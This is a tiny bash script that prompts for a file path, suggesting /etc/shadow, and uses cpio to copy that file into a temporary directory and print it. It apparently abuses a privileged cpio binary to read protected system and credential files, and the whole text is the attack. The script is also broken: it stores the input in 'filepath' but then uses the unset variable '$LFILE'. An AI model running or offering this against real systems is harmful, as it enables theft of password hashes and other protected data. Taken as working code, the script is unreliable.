#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
TF=$(mktemp -d)
echo "$LFILE" | cpio -R $UID -dp $TF
cat "$TF/$LFILE"
